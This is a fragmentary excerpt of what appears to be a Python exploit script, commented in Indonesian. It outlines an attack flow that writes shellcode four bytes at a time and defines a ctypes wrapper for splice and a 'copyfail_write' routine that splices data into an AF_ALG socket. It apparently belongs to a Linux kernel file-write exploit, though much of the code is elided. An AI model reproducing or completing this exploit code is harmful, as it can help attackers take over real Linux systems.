...
Alur Serangan (sesuai diagram):
  ...
  4. Ulangi untuk setiap 4-byte shellcode
...
# --- Robust fallback: os.splice tidak ada di Python < 3.10 ---
if not hasattr(os, 'splice'):
    _libc = ctypes.CDLL("libc.so.6", use_errno=True)
    _libc_splice = _libc.splice
    _libc_splice.argtypes = [
        ctypes.c_int,
    ...
    _libc_splice.restype = ctypes.c_ssize_t

    def _os_splice(fd_in, fd_out, count, offset_src=None, offset_dst=None, flags=0):
        ...
        poff_in = ctypes.byref(off_in) if off_in is not None else None
        poff_out = ctypes.byref(off_out) if off_out is not None else None
        result = _libc_splice(fd_in, poff_in, fd_out, poff_out, count, flags)
        if result == -1:
            errno = ctypes.get_errno()
            raise OSError(errno, os.strerror(errno))
        return result

    os.splice = _os_splice

# --- Robust fallback: socket.AF_ALG tidak ada di Python < 3.10 ---
...
def copyfail_write(filedes: int, offset: int, chunk: bytes) -> None:
    ...
    # splice from pipe -> AF_ALG socket
